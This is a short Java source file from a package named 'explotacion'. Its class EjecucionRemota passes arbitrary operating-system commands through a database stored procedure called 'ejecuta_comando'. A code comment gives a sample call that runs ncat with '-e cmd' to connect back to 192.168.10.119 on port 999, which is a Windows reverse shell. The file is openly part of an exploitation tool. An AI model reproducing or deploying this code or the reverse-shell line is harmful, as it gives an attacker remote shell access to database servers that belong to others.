package explotacion;

import conexion.*;

public class EjecucionRemota {

	public EjecucionRemota() {
		// TODO Auto-generated constructor stub
	}
	
	public boolean ejecutarComando(Conexion con, String comando)
	{
		boolean resultado=false;
		//CALL ejecuta_comando('C:\Program Files (x86)\Nmap\ncat.exe 192.168.10.119 999 -e cmd');
		String procedimiento="ejecuta_comando";
		resultado=con.ejecutaProcedimiento(procedimiento,comando);		
		return resultado;
	}

}
